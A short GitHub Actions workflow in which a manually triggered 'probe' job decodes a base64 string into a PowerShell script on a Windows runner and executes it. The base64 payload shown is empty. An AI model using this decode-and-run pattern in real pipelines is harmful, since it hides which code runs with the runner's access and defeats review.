name: edge-httpslink-check2
on:
  workflow_dispatch: {}
jobs:
  probe:
    runs-on: windows-latest
    timeout-minutes: 40
    steps:
      - name: probe
        shell: pwsh
        run: |
          $b64 = ""
          $tmp = Join-Path $env:RUNNER_TEMP "hl2.b64"
          Set-Content -Path $tmp -Value $b64 -NoNewline
          [IO.File]::WriteAllBytes((Join-Path $env:RUNNER_TEMP "hl2.ps1"), [Convert]::FromBase64String((Get-Content -Raw $tmp)))
          & (Join-Path $env:RUNNER_TEMP "hl2.ps1")
